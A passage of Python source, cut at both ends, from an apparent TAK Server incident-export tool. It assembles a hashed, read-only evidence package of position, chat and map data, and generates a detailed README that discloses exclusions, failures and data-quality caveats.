    reason = " ".join(str(s.get("detail") or "no reason recorded").split())
    reason = "".join(c for c in reason if ord(c) >= 32 and ord(c) != 127)
    return f"could not be compared: {reason[:300]}"


def _shapes_fate(manifest_row, headers, shape_summary):
    """The manifest's in_shapes_export value for one uid. Distinguishes the
    states the same way exclusion_reason does for cot.csv, and never
    collapses "shapes.csv was not part of this package" into "no"."""
    idx = {h: i for i, h in enumerate(headers)}
    types = manifest_row[idx["cot_types_seen"]] or ""
    is_shape = any(cot_category(t) == "Map objects" for t in types.split())
    if not is_shape:
        return "n/a - not a drawn map object"
    if shape_summary is None:
        return "n/a - shapes.csv not selected"
    uid = manifest_row[idx["uid"]]
    if uid in shape_summary["included_uids"]:
        return "yes"
    feed_uids = shape_summary.get("feed_uids") or {}
    if uid in feed_uids:
        return f"no - from an automated feed (the record carries a {feed_uids[uid]} element)"
    if uid in shape_summary["excluded_uids"]:
        return "no - no part of the shape touched the bounding box"
    if uid in shape_summary["no_geometry_uids"]:
        return "no - no drawable geometry in any version"
    # Seen by the manifest but not by the shapes query: the only way that
    # happens is the channel filter, which shapes.csv applies and the
    # manifest's universe does not.
    return "no - not on a selected channel"


def build_package(conn, params, case_id, actor, app_version,
                   included=None, channels=None, include_kmz=True,
                   requested_for=None, app_commit=None, include_feed_shapes=False,
                   schema_baseline=None):
    """Run the selected queries and assemble the package.

    included: None means every optional file (the default). A collection of
    filenames narrows it to those, plus manifest.csv which always runs - a
    file left out is never queried at all, not just left out of the zip,
    which is the point when the excluded data (e.g. camera names in
    video.csv) is itself sensitive and unrelated to the incident.

    include_kmz: whether to bundle locations.kmz (a rendering of cot.csv's
    own rows) alongside cot.csv. True by default. It's presented as its own
    tile on the Export page, so an operator who deliberately deselects it
    must actually get a zip without it - otherwise the selection UI is
    lying, and "a file left out is never in the zip" stops being true.
    Recorded in files_excluded so the README and audit log both say so.

    channels: None means every channel (the default). A collection of
    channel bitpos values restricts every channel-bearing file to rows on
    at least one of them; see build_queries() and CHANNEL_FILTERABLE_FILES
    for exactly which files that covers.

    include_feed_shapes: False (the default) leaves shapes pushed by an
    automated feed (shapes.AUTOMATED_FEED_MARKS) out of shapes.csv and the
    KMZ's drawn-shapes folder; the README states the rule and the count,
    and the manifest names each such uid. True includes them, and the
    README says the operator chose that. Nothing else changes: cot.csv
    and cot_router-raw.csv carry their rows either way.

    Returns (zip_bytes, summary_dict). The summary reports per-file record
    counts, any query failures, which optional files were excluded, and
    which channels (of those present in this window/area) were excluded,
    so the caller can log and display them.
    """
    counts = {}
    failures = {}
    contents = {}

    selected_queries = build_queries(params, channels=channels, included=included)
    included_names = {name for name, _sql, _params in selected_queries}
    files_excluded = sorted(name for name in OPTIONAL_FILES
                             if name not in included_names)
    # locations.kmz only ever exists as a rendering of cot.csv, so "excluded"
    # is only a meaningful, operator-driven statement when cot.csv itself is
    # in the package - if cot.csv is out, the KMZ is out with it and that's
    # already disclosed as cot.csv's own exclusion.
    if not include_kmz and "cot.csv" in included_names:
        files_excluded.append("locations.kmz")

    # Everything below reads from one database snapshot - see begin_snapshot().
    context = {}
    begin_snapshot(conn, context)

    # Three distinct states, kept distinguishable all the way to the README:
    # no filter applied at all (None); filter applied and verified, some or
    # zero channels actually excluded (a list, possibly empty); filter
    # applied but the verification query itself failed, so what got
    # excluded (if anything) is genuinely unknown (channels_excluded_unknown).
    # Collapsing any of these into the others would mean the README could
    # assert something it never actually checked.
    channels_excluded = None
    channels_excluded_unknown = False
    available = []
    if channels is not None:
        try:
            available = _available_channels(conn, params)
            selected_set = set(channels)
            channels_excluded = sorted(
                name for bitpos, name in available if bitpos not in selected_set
            )
        except Exception:
            _rollback_and_restart(conn, context)
            channels_excluded_unknown = True

    cot_rows, cot_headers = None, None
    shape_rows, shape_headers = None, None
    manifest_rows, manifest_headers = None, None
    statements = []   # (name, statement as sent) for queries.sql
    for filename, sql, sql_params in selected_queries:
        try:
            with conn.cursor() as cur:
                try:
                    statements.append((filename, render_statement(cur, sql, sql_params)))
                except Exception as e:   # the query itself still runs
                    statements.append((filename, f"-- statement could not be rendered: {type(e).__name__}: {e}"))
                cur.execute(sql, sql_params)
                rows = cur.fetchall()
                headers = [d[0] for d in cur.description]
            if filename == "shapes.csv":
                # Raw versions, not yet box-filtered - finished below once
                # the geometry has been parsed (see shapes.build_rows).
                shape_rows, shape_headers = rows, headers
                continue
            contents[filename] = _rows_to_csv(headers, rows)
            counts[filename] = len(rows)
            if filename == "cot.csv":
                cot_rows, cot_headers = rows, headers
            elif filename == "manifest.csv":
                # Kept so an in_shapes_export column can be added once the
                # shape inclusion decisions exist - the manifest is where
                # every uid's fate is accounted for, and shapes.csv's rule
                # differs from cot.csv's (see below), so it gets its own
                # column rather than being folded into exclusion_reason.
                manifest_rows, manifest_headers = rows, headers
        except Exception as e:
            _rollback_and_restart(conn, context)
            failures[filename] = f"{type(e).__name__}: {e}"
            contents[filename] = ""
            counts[filename] = 0

    # shapes.csv: the geometry-touches-box rule, applied in Python to the
    # real vertices (see shapes.py's module docstring and build_rows for
    # why SQL can't do this and why the rule differs from cot.csv's).
    # Deletions come from mission_change REMOVE_CONTENT rows and are
    # joined to the shapes that made it in.
    shape_summary = None
    shape_collection = None
    if shape_rows is not None:
        deletions = []
        deletion_sql = SHAPE_DELETIONS_SQL
        deletion_params = (params["start"], params["end"])
        try:
            with conn.cursor() as cur:
                statements.append(("shapes-deletions",
                                   render_statement(cur, deletion_sql, deletion_params)))
                cur.execute(deletion_sql, deletion_params)
                deletions = cur.fetchall()
        except Exception as e:
            _rollback_and_restart(conn, context)
            # Versions still ship; only the deletion rows are missing, and
            # the README says so rather than the file looking complete.
            failures["shapes.csv"] = f"deletions unavailable - {type(e).__name__}: {e}"
        # Parsed once; shapes.csv and the KMZ's drawn-shapes folder are
        # both rendered from this same collection so they cannot disagree.
        out_rows, shape_summary, shape_collection = shapes.build_rows(
            shape_rows, shape_headers, deletions, params, NOT_RECORDED,
            include_feed_shapes=include_feed_shapes)
        contents["shapes.csv"] = _rows_to_csv(shapes.CSV_HEADERS, out_rows)
        counts["shapes.csv"] = len(out_rows)

    if manifest_rows is not None:
        contents["manifest.csv"] = _rows_to_csv(
            manifest_headers + ["in_shapes_export"],
            [list(r) + [_shapes_fate(r, manifest_headers, shape_summary)]
             for r in manifest_rows])

    # The plain query and the raw rows travel with cot.csv: they are what a
    # later reader checks it against, so they are only meaningful when
    # cot.csv itself is in the package.
    if cot_rows is not None:
        chan_and, chan_params = channel_where_clause("r.groups", channels, prefix="AND")
        raw_params = (params["start"], params["end"], params["west"], params["south"],
                      params["east"], params["north"]) + tuple(chan_params)
        # The plain query is NOT written into the package - a file inside the
        # zip must not look like the second confirmation. Its statement goes
        # into queries.sql so the administrator's re-run produces it.
        with conn.cursor() as cur:
            try:
                statements.append(("positions-plain.csv",
                                   render_statement(cur, PLAIN_POSITIONS_SQL, plain_positions_params(params))))
            except Exception as e:
                statements.append(("positions-plain.csv", f"-- statement could not be rendered: {type(e).__name__}: {e}"))
        # The raw rows: the one file written exactly as psql would write the
        # same statement's output, so the re-run's copy matches it by hash.
        name = "cot_router-raw.csv"
        columns, columns_error = cot_router_columns(conn)
        if columns_error:
            # The catalogue read failed, which also left the transaction
            # aborted - restart the snapshot here rather than letting the
            # next statement fail and be blamed for it.
            _rollback_and_restart(conn, context)
        sql = raw_rows_sql(chan_and, columns)
        try:
            with conn.cursor() as cur:
                try:
                    statements.append((name, render_statement(cur, sql, raw_params)))
                except Exception as e:
                    statements.append((name, f"-- statement could not be rendered: {type(e).__name__}: {e}"))
                cur.execute(sql, raw_params)
                rows = cur.fetchall()
                headers = [d[0] for d in cur.description]
            contents[name] = psql_csv(headers, rows)
            counts[name] = len(rows)
            if columns_error:
                # The file exists and holds the rows, so this is not a
                # generation failure - but it was written from r.*, whose
                # values are typed rather than cast to text by the server,
                # so it cannot match a re-check by hash. Recorded the same
                # way shapes.csv records missing deletions: the file ships,
                # and the README says what is wrong with it.
                failures[name] = (f"column list unavailable - written without the server's "
                                  f"own text formatting, so this file will NOT match a "
                                  f"re-check by hash - {columns_error}")
        except Exception as e:
            _rollback_and_restart(conn, context)
            failures[name] = f"{type(e).__name__}: {e}"
            contents[name] = ""
            counts[name] = 0

    # locations.kmz: a second rendering of cot.csv's exact query result, so
    # the two can't disagree. Bundled whenever cot.csv is AND the operator
    # left its tile selected; absent whenever cot.csv is excluded or fails,
    # or the operator deselected it (see include_kmz in the docstring).
    # Local import: kmz.py already imports this module, so importing kmz
    # at module level here would be circular.
    if cot_rows is not None and include_kmz:
        import kmz
        contents["locations.kmz"] = kmz.build_kmz(
            cot_rows, cot_headers, params, case_id, actor, app_version,
            requested_for=requested_for, shape_collection=shape_collection,
        )

    # Live table census.
    census = {}
    for table, label in CENSUS_TABLES:
        try:
            with conn.cursor() as cur:
                cur.execute(f"SELECT count(*) FROM {table};")
                census[label] = cur.fetchone()[0]
        except Exception:
            _rollback_and_restart(conn, context)
            census[label] = "unavailable"

    # Server context for the README.
    try:
        with conn.cursor() as cur:
            cur.execute("SHOW server_version;")
            context["pg_version"] = cur.fetchone()[0]
            cur.execute("SHOW timezone;")
            context["db_timezone"] = cur.fetchone()[0]
            read_source_identity(conn, context, cur=cur)
            cur.execute("""SELECT count(*), min(servertime), max(servertime)
                           FROM cot_router;""")
            total, oldest, newest = cur.fetchone()
            context["db_total"] = total
            context["db_oldest"] = oldest
            context["db_newest"] = newest
    except Exception:
        _rollback_and_restart(conn, context)

    # All quality checks in a single pass. Eleven separate scans over a large
    # positional set was the dominant cost in earlier versions.
    quality = {}
    checks = QUALITY_CHECKS

    # A plain count(*) rides along with the FILTER counts in the same single
    # pass, so the true number of matching positions is known even when
    # cot.csv itself was excluded from this package - the audit log's record
    # count should reflect what was in scope, not just what was zipped. The
    # channel clause matches cot.csv's own WHERE exactly, so this describes
    # the same rows cot.csv actually contains, not the pre-channel-filter set.
    quality_chan_and, quality_chan_params = channel_where_clause(
        "groups", channels, prefix="AND"
    )
    positional_total = None
    try:
        with conn.cursor() as cur:
            cur.execute(quality_sql(quality_chan_and, checks),
                        (params["start"], params["end"], params["west"], params["south"],
                         params["east"], params["north"], *quality_chan_params))
            values = cur.fetchone()
        positional_total = values[0]
        quality = {label: values[i + 1] for i, (label, _c) in enumerate(checks)}
    except Exception as e:
        # Printed, not silently swallowed: this handler hid a ValueError
        # from psycopg2's %-interpolation (see the doubled %% in `checks`
        # above) for long enough that every export shipped a README whose
        # entire DATA QUALITY SUMMARY read "unavailable", and nothing
        # anywhere said why.
        print(f"DATA QUALITY SUMMARY FAILED: {type(e).__name__}: {e}", flush=True)
        _rollback_and_restart(conn, context)
        quality = {label: "unavailable" for label, _c in checks}
        positional_total = counts.get("cot.csv")

    # None (not 0) when video.csv wasn't actually generated - excluded by
    # the operator, or its own query failed - so the README can say "not
    # checked" instead of a bare 0 that reads as "checked, found none".
    if "video.csv" in contents and "video.csv" not in failures:
        redactions = contents["video.csv"].count("CREDENTIALS-REDACTED")
    else:
        redactions = None

    # Was the database still shaped the way it was when this tool was
    # connected? Catalogue reads only, inside the snapshot already held, so
    # it reads the same instant every file above did.
    schema_result = schema_check_result(conn, schema_baseline)

    readme = build_readme(
        case_id, actor, params, counts, failures, census,
        context, quality, redactions, app_version,
        files_excluded, positional_total, channels_excluded,
        channels_excluded_unknown, requested_for, app_commit=app_commit,
        feed_shapes=_feed_shapes_note(actor, shape_summary, include_feed_shapes),
        schema=schema_result,
    )
    contents["README.txt"] = readme
    # The re-run script. Built after context so it can pin the database
    # timezone the window was interpreted in.
    contents["queries.sql"] = build_queries_sql(case_id, app_version, context, statements)
    # How to check this package, for whoever has it and not the tool. Built
    # after everything it counts, so SHA256SUMS covers it too.
    #
    # The certification is NOT written in here any more. It was a blank form
    # duplicating facts the tool already holds - the zip's own hash, which
    # does not exist yet at this point, and a re-check that has not happened
    # - and nothing ever read it back. Verify & Replay produces it with
    # those sections filled in instead (see build_certification's callers).
    contents["VERIFY.txt"] = build_verify_txt(
        case_id, app_version, app_commit, context, len(contents) + 2)

    # Hash every file, then add the hash file itself last. Every value here
    # is text (CSV/README) except locations.kmz, which is already the raw
    # zip bytes kmz.build_kmz() returns - hash whichever it is directly
    # rather than mangling binary content through a text encoding.
    lines = []
    file_hashes = []
    for name in sorted(contents):
        data = contents[name]
        raw = data if isinstance(data, bytes) else data.encode("utf-8")
        digest = hashlib.sha256(raw).hexdigest()
        lines.append(f"{digest}  {case_id}-{name}")
        file_hashes.append((f"{case_id}-{name}", digest))
    contents["SHA256SUMS.txt"] = "\n".join(lines) + "\n"

    # Zip it. Deterministic entry timestamps (see write_deterministic_zip_entry)
    # so the same underlying export produces the same zip bytes every time.
    zbuf = io.BytesIO()
    with zipfile.ZipFile(zbuf, "w", zipfile.ZIP_DEFLATED) as z:
        for name in sorted(contents):
            write_deterministic_zip_entry(z, f"{case_id}-{name}", contents[name])

    # For the re-check token (app.py): the script exactly as zipped, and
    # the raw file's hash as SHA256SUMS.txt states it - what the server's
    # recheck-cot_router-raw.csv is expected to equal.
    raw_sha256 = None
    if "cot_router-raw.csv" in contents:
        raw_data = contents["cot_router-raw.csv"]
        raw_sha256 = hashlib.sha256(raw_data if isinstance(raw_data, bytes) else raw_data.encode("utf-8")).hexdigest()

    summary = {
        "schema": schema_result,
        "counts": counts,
        "failures": failures,
        "redactions": redactions,
        "positional_records": positional_total,
        "files_excluded": files_excluded,
        "channels_excluded": channels_excluded,
        "channels_excluded_unknown": channels_excluded_unknown,
        "source_identity": source_identity(context),
        "queries_sql": contents.get("queries.sql"),
        "raw_sha256": raw_sha256,
        # Every file in the package and its hash, exactly as SHA256SUMS.txt
        # states them, so app.py can record the list in the audit entry
        # instead of leaving it only inside the zip. SHA256SUMS.txt itself
        # is not in the list - it is the list. Neither is the zip: that
        # hash is the audit row's own package_sha256.
        "file_hashes": file_hashes,
        # For the audit log: how many feed-shape objects the rule left out
        # (None when shapes.csv was not part of the package), and whether
        # the operator chose to include them.
        "feed_shapes_left_out": (len(shape_summary["feed_uids"]) if shape_summary else None),
        "feed_shapes_included": include_feed_shapes,
    }
    return zbuf.getvalue(), summary


def _feed_shapes_note(actor, shape_summary, include_feed_shapes):
    """The README's statement about shapes from automated feeds: what mark
    was looked for, what was found, and what was done with it. Written so
    that "none found" and "shapes.csv not selected" read differently from
    "left out", and so the operator's choice to include them is recorded
    as their choice."""
    marks = ", ".join(shapes.AUTOMATED_FEED_MARKS)
    if shape_summary is None:
        return ("shapes.csv was not part of this export, so the automated-feed rule "
                f"(shapes carrying a <{marks}> element) was not applied to anything.")
    found = shape_summary.get("feed_marks") or {}
    n_objects = sum(found.values())
    if not n_objects:
        return (f"No shape record in this window carried an automated-feed element "
                f"(<{marks}>); nothing was left out under that rule.")
    by_mark = ", ".join(f"<{m}> on {n} object(s)" for m, n in sorted(found.items()))
    if include_feed_shapes:
        return (f"{actor} chose to INCLUDE shapes from automated feeds: {by_mark} "
                f"are in shapes.csv and locations.kmz alongside the hand-drawn shapes. "
                f"The <{marks}> element is written by the software that pushed the "
                f"shape to the server, not by a person drawing at a map.")
    return (f"{shape_summary['feed_versions']} shape record(s) from {n_objects} object(s) "
            f"were LEFT OUT of shapes.csv and locations.kmz: {by_mark}. That element is "
            f"written by the software that pushed the shape to the server (Node-RED's "
            f"TAK node writes <__nodered>), not by a person drawing at a map. The rows "
            f"are still in cot_router-raw.csv and, as anchor points, in cot.csv; the "
            f"re-check's shapes result contains them too, because the rule is applied "
            f"after the statement runs. manifest.csv names every such uid with this "
            f"reason in in_shapes_export. The Export page's 'Include shapes from "
            f"automated feeds' box (Drawn shapes, beside the selected area) includes them instead.")


def _skew_text(context):
    a, b = context.get("db_now"), context.get("tool_now")
    if not (hasattr(a, "timestamp") and hasattr(b, "timestamp")):
        return "unknown"
    d = (a - b).total_seconds()
    return f"{d:+.3f} s (database clock minus tool clock)"


def _snapshot_text(context):
    snaps = context.get("snapshots") or []
    if not snaps or snaps == ["unavailable"]:
        return ("unavailable - " + context.get("snapshot_error", "not recorded")
                + "; statements were NOT guaranteed to read one instant")
    restarts = context.get("snapshot_restarts", 0)
    if restarts:
        return (f"{snaps[0]} then restarted {restarts} time(s) after a failed query "
                f"({', '.join(snaps[1:])}); files after a restart may reflect a later instant")
    return f"{snaps[0]} - every statement in this package read the database at this one instant"


def build_readme(case_id, actor, p, counts, failures, census,
                 context, quality, redactions, app_version,
                 files_excluded, positional_total, channels_excluded=None,
                 channels_excluded_unknown=False, requested_for=None, app_commit=None,
                 feed_shapes=None, schema=None):
    """Generate the plain-language README that ships with the package."""

    def pct(n, total):
        if not isinstance(n, int) or not total:
            return ""
        return f"  ({n / total * 100:.1f}%)"

    total = positional_total if positional_total is not None else counts.get("cot.csv", 0)

    if files_excluded:
        selection_note = (
            f"{actor} excluded {len(files_excluded)} of {len(OPTIONAL_FILES) + 1} "
            f"selectable file(s) from this export: {', '.join(files_excluded)}"
        )
    else:
        selection_note = f"{actor} included every optional file (the default)."

    # Four states, not three - collapsing "verification failed" into either
    # of the other two would mean claiming something this export never
    # actually confirmed. Checked in this order because an unknown result
    # is the one thing that must never be silently read as "nothing excluded".
    if channels_excluded_unknown:
        channel_note = (
            f"{actor} applied a channel filter, but this export COULD NOT "
            f"VERIFY which channels (if any) it excluded - the verification "
            f"query itself failed. cot.csv and the other channel-filterable "
            f"files were still restricted to the selected channels; only the "
            f"disclosure of what was left out is missing here. Treat this "
            f"export's channel scope as UNVERIFIED and re-run it if that "
            f"matters for this case."
        )
    elif channels_excluded is None:
        channel_note = "No channel filter was applied to this export."
    elif channels_excluded:
        channel_note = (
            f"{actor} excluded {len(channels_excluded)} channel(s) present in "
            f"this window/area: {', '.join(channels_excluded)}. This narrows "
            f"cot.csv, connections.csv, chat.csv, missions.csv, files.csv, "
            f"video.csv, and datafeeds.csv only - see CHANNELS below for why "
            f"the rest can't be channel-filtered, and manifest.csv for which "
            f"devices this excluded and why."
        )
    else:
        channel_note = f"{actor} included every channel present in this window/area (the default)."

    # One line in THIS EXPORT; the full statement sits under AUTOMATED FEEDS.
    if feed_shapes and feed_shapes.startswith(f"{actor} chose to INCLUDE"):
        feed_line = "included at the operator's choice - see AUTOMATED FEEDS above"
    else:
        feed_line = "left out (the default) - see AUTOMATED FEEDS above"
    feed_block = textwrap.fill(feed_shapes or "not stated", width=78,
                               initial_indent="  ", subsequent_indent="  ")

    file_lines = []
    descriptions = {
        "cot.csv": (
            "THE MAIN FILE. One row per position report, filtered to the time\n"
            "   window AND inside the geographic box AND having a real position\n"
            "   fix AND (if a channel filter was applied) on a selected channel.\n"
            "   Sorted by device then time, so each track reads top to bottom."
        ),
        "manifest.csv": (
            "THE ACCOUNTABILITY FILE. One row per unique ID active during the\n"
            "   time window, with NO geographic filter, NO position filter, and\n"
            "   NO channel filter applied to who's LISTED. States whether each\n"
            "   made the main file, and why not if it did not - including\n"
            "   exclusion by the channel filter, if one was applied. ALWAYS\n"
            "   INCLUDED regardless of which optional files or channels were\n"
            "   selected for this export - it is not itself optional."
        ),
        "connections.csv": (
            "Connected / Disconnected records for client devices - when each\n"
            "   was connected, including one that never reported a usable\n"
            "   position. Channel filtered, if one was applied; not geo filtered."
        ),
        "chat.csv": (
            "Chat messages during the window. NOT geographically filtered, on\n"
            "   purpose - chat usually carries no position and a spatial filter\n"
            "   would silently delete nearly all of it. Channel filtered, if one\n"
            "   was applied."
        ),
        "missions.csv": (
            "Shared workspaces in TAK. Not time filtered, because a mission\n"
            "   created before the incident can still be relevant to it. Channel\n"
            "   filtered, if one was applied - not time or geo filtered."
        ),
        "shapes.csv": (
            "DRAWN MAP OBJECTS as real geometry: fire lines, perimeters, circles,\n"
            "   dropped points. One row per VERSION of each object (every time it\n"
            "   was drawn, moved or reshaped) with its full vertex list or centre\n"
            "   and radius, plus a 'deleted' row for each removal recorded by the\n"
            "   server. These same objects appear in cot.csv as single points\n"
            "   only, because the database indexes one anchor point per record.\n"
            "   AREA RULE DIFFERS FROM cot.csv - see SHAPES below. Shapes pushed\n"
            "   by an automated feed are left out unless chosen - see AUTOMATED\n"
            "   FEEDS below. Channel filtered, if one was applied."
        ),
        "mission-changes.csv": (
            "Mission edit history during the window. change_type is the server's\n"
            "   internal numeric code; change_type_name decodes it (ADD_CONTENT,\n"
            "   REMOVE_CONTENT, ...) from TAK Server's own published source, with\n"
            "   the raw number kept beside it so nothing is lost in translation.\n"
            "   NOT channel filterable: a mission edit has no channel of its own\n"
            "   in this database, so the channel filter (if any) does not apply."
        ),
        "mission-subs.csv": (
            "Who was subscribed to which mission, and since when. NOT channel\n"
            "   filterable - a subscription has no channel of its own."
        ),
        "mission-contents.csv": (
            "Items belonging to missions: map items, attached files, external\n"
            "   data feeds. The record_kind column says which each row is. NOT\n"
            "   channel filterable - these items have no channel of their own."
        ),
        "files.csv": (
            "INVENTORY of files in the server's file store: name, size, type,\n"
            "   uploader, timestamp, SHA hash. File CONTENTS are not included.\n"
            "   Channel filtered, if one was applied; not time or geo filtered."
        ),
        "attachments.csv": (
            "Images and links attached to individual map events. NOT channel\n"
            "   filterable directly - inherits nothing from the parent event's\n"
            "   channel, since attachments themselves carry no channel value."
        ),
        "video.csv": (
            "Video feed references - camera aliases, positions, stream URLs.\n"
            "   These are POINTERS, not recordings. Footage lives on the\n"
            "   streaming server or camera. Stream URLs have had any embedded\n"
            "   username and password replaced. NOT time filtered: a camera is\n"
            "   configuration, not an event, so every configured camera is\n"
            "   listed regardless of the requested window - the created and\n"
            "   deleted columns show when it was configured and, if\n"
            "   applicable, removed. Channel filtered, if one was applied."
        ),
        "datafeeds.csv": (
            "Data feed configuration, for resolving the data_feed_names column\n"
            "   in the main file. Feed credentials are excluded. NOT time\n"
            "   filtered. Channel filtered, if one was applied."
        ),
        "federation.csv": (
            "Federation CONNECTION ACTIVITY - connect/disconnect events and\n"
            "   'send-changes' notifications (a batch of updates was pushed to\n"
            "   a federate), not a record of individual CoT messages. Their\n"
            "   presence does NOT by itself mean data went to an outside agency\n"
            "   - entries can refer to this organisation's own internal\n"
            "   infrastructure. The 'remote' column distinguishes remote\n"
            "   exchanges. VERIFIED, not assumed: there is no way to trace a\n"
            "   specific position, chat message, or other record in this\n"
            "   package to a specific federation transfer. cot_router carries\n"
            "   no column recording how or whether a record was federated, and\n"
            "   the fed_event table this file comes from has no key joining it\n"
            "   back to individual records - a 'send-changes' row means a\n"
            "   batch went out, not which records were in it. NOT channel\n"
            "   filterable - a federation record has no channel of its own."
        ),
    }

    n = 1
    for name, _sql, _params in build_queries(p):
        if name in files_excluded:
            file_lines.append(
                f"{n}. {case_id}-{name}    NOT INCLUDED IN THIS PACKAGE\n   "
                f"Excluded by operator selection at export time - this file\n"
                f"   does not exist in the zip. See FILE SELECTION above.\n   "
                f"{descriptions.get(name, '')}\n"
            )
        else:
            c = counts.get(name, 0)
            note = ""
            if name in failures:
                note = f"\n   *** THIS FILE FAILED TO GENERATE: {failures[name]} ***"
            file_lines.append(
                f"{n}. {case_id}-{name}    {c} records\n   "
                f"{descriptions.get(name, '')}{note}\n"
            )
        n += 1
        if name == "cot.csv":
            # Not a separately selectable file - see the comment in
            # build_package(). Its own inclusion/failure state is
            # cot.csv's, since it's built from that exact query result.
            if "cot.csv" in files_excluded:
                file_lines.append(
                    f"{n}. {case_id}-locations.kmz    NOT INCLUDED IN THIS PACKAGE\n   "
                    f"A Google Earth rendering of the exact same rows as cot.csv -\n"
                    f"   it can only exist when cot.csv does, so it's excluded\n"
                    f"   whenever cot.csv is. (For a standalone KMZ without the rest\n"
                    f"   of this package, use the separate locations-only download.)\n"
                )
            elif "locations.kmz" in files_excluded:
                file_lines.append(
                    f"{n}. {case_id}-locations.kmz    NOT INCLUDED IN THIS PACKAGE\n   "
                    f"Excluded by operator selection at export time - the KMZ tile\n"
                    f"   was deselected while cot.csv was kept. The same rows are\n"
                    f"   still in cot.csv; only the map rendering of them is absent.\n"
                )
            elif "cot.csv" in failures:
                file_lines.append(
                    f"{n}. {case_id}-locations.kmz    NOT INCLUDED IN THIS PACKAGE\n   "
                    f"cot.csv's query failed (see above), so there were no rows to\n"
                    f"   render into this file.\n"
                )
            else:
                file_lines.append(
                    f"{n}. {case_id}-locations.kmz    {counts.get('cot.csv', 0)} positions\n   "
                    f"A Google Earth (KML/KMZ) rendering of the exact same rows as\n"
                    f"   cot.csv, generated from that identical query result, so the\n"
                    f"   two cannot disagree. Bundled in this same zip whenever\n"
                    f"   cot.csv is, unless its tile is deselected at export time.\n"
                )
            n += 1
            if "cot.csv" not in files_excluded:
                for extra, blurb in (
                    ("cot_router-raw.csv",
                     "Every column of the server's cot_router table for exactly the\n"
                     "   rows in cot.csv, as the server stores them - nothing parsed or\n"
                     "   renamed - with readable latitude/longitude added at the end\n"
                     "   (event_pt itself is the server's hex-encoded geometry). Every\n"
                     "   value was cast to text by the server and the file is written the\n"
                     "   way psql writes CSV, so the administrator's re-run of the same\n"
                     "   statement (queries.sql) produces a byte-identical file: its\n"
                     "   SHA-256 should equal this file's line in SHA256SUMS.txt.\n"
                     "   UNMODIFIED: unlike every other CSV here, cells carry no\n"
                     "   spreadsheet-formula guard. Do not open it in Excel; read it with\n"
                     "   a text editor or a database tool."),
                ):
                    c = counts.get(extra, 0)
                    note = f"\n   *** THIS FILE FAILED TO GENERATE: {failures[extra]} ***" if extra in failures else ""
                    file_lines.append(f"{n}. {case_id}-{extra}    {c} records\n   {blurb}{note}\n")
                    n += 1
    file_lines.append(
        f"{n}. {case_id}-queries.sql\n"
        "   Every SQL statement this export ran, with its bound values, exactly\n"
        "   as sent to the server - a script that re-runs them all against the\n"
        "   TAK Server database so the results can be compared with these files.\n"
        "   See WHERE THIS DATA CAME FROM below.\n"
    )
    file_lines.append(
        f"{n + 1}. {case_id}-VERIFY.txt\n"
        "   How to check this package: the one command that checks every file\n"
        "   against the list below, and what that does and does not show. Start\n"
        "   there. (A certification for a records custodian to sign, with these\n"
        "   facts already filled in, is produced from TAK-Extract's Verify &\n"
        "   Replay page rather than shipped blank in here.)\n"
    )
    file_lines.append(
        f"{n + 2}. {case_id}-SHA256SUMS.txt\n"
        "   The SHA-256 hash of every file above, calculated when the package was built.\n"
    )
    file_lines.append(f"{n + 3}. {case_id}-README.txt\n   This file.\n")

    census_lines = "\n".join(
        f"  {label:<32}: {value}" for label, value in census.items()
    )
    quality_lines = "\n".join(
        f"  {label:<36}: {v}{pct(v, total)}" for label, v in quality.items()
    )

    if failures:
        failure_block = (
            "  THE FOLLOWING FILES FAILED TO GENERATE:\n"
            + "\n".join(f"    {k}: {v}" for k, v in failures.items())
            + "\n  This package is INCOMPLETE. Do not rely on it until re-run."
        )
    else:
        failure_block = "  None. Every query completed successfully."

    # None means video.csv was never actually generated (excluded, or its
    # own query failed) - say so plainly rather than printing a bare 0 that
    # reads as "checked, found nothing", the same unavailable-vs-zero
    # mistake this README's own SENTINEL VALUES section warns readers about.
    if redactions is None:
        redaction_text = "N/A - video.csv was not included in this export, so no redaction check ran"
    else:
        redaction_text = str(redactions)

    return f"""\
===============================================================================
                     TAK SERVER INCIDENT EXPORT - README
===============================================================================

WHAT THIS PACKAGE IS
--------------------
This is an extract from a TAK (Team Awareness Kit) Server database. TAK is a
mapping and situational-awareness system: people and vehicles carry devices
running a TAK client, and those devices report their position to the server
every few seconds. The server also carries chat, shared map markers, shared
files, and video feed references.

This package answers the question "who and what was in this geographic area
during this period of time", and shows its work.

WHERE THIS DATA CAME FROM
-------------------------
The chain is short, and each link is recorded:

  1. A device running a TAK client (ATAK, WinTAK, iTAK, ...) sends a position
     report - a small XML message called a CoT event - to the TAK Server,
     typically every few seconds while it is connected.
  2. TAK Server stores each report as one row in its PostgreSQL database
     (table cot_router), stamping it with the moment the server received it
     (servertime) alongside the time the device itself claimed (event_time).
     Chat, drawn shapes, missions and files are stored in other tables.
  3. This tool connects to that database with a read-only account, runs the
     SELECT statements in queries.sql, and writes what they return into the
     CSV files here. It adds nothing, corrects nothing and judges nothing: a
     value the server holds is copied; a value the server never had is left
     blank or marked "not recorded". Columns that are pulled out of the
     device's XML for convenience (see PARSED VERSUS AUTHORITATIVE COLUMNS)
     travel with the XML they were pulled from, so each can be checked
     against the other in the same row.
  4. The finished package is hashed and the hash is written to the tool's
     audit log before the file is delivered.

The tool's source code is public, so step 3 can be read rather than taken on
trust. The cot_router id in every position row is the server's own record
number for that report, which is how a single row can be traced back.

WHO CAN READ IT
---------------
Every file is a plain CSV that opens in Excel, LibreOffice, or any text
editor. No special software is needed. This README explains every file and
every column, including the ones that look like errors but are not.

OPENING THE FILES IN EXCEL - READ THIS FIRST
--------------------------------------------
Do not just double-click the CSV. Excel will guess at the column types and
will mangle the timestamps - a time like "2026-08-14 17:23:41-04" can display
as "23:41.0" or as a duration. Instead:

  Excel: Data tab > From Text/CSV > select the file > in the preview click
         "Transform Data", set every timestamp column to "Text", then Load.
  Or:    open the file in a plain text editor to read raw values.

The underlying file is correct either way; this only affects display.

THE FIRST THING TO UNDERSTAND ABOUT THE DATA
--------------------------------------------
The main data file is filtered - by time AND by a geographic box. That is the
point of the export, but it means devices that were active but outside the box
do not appear in it.

So that nothing looks hidden, the MANIFEST file lists EVERY device that was
active during the same period with NO geographic filter at all, and states for
each one whether it made it into the main file and, if not, exactly why. Read
the manifest alongside the main file, not instead of it.

SHAPES - A DIFFERENT AREA RULE, STATED UP FRONT
A drawn map object (a fire line, a perimeter, a circle) is not at one place;
it has many vertices. The database indexes only one anchor point per record,
so cot.csv's rule - "the point is inside the box" - would keep or drop a
whole fire line based on where its anchor happened to fall, even one that
runs straight through the box. shapes.csv therefore uses a wider rule:

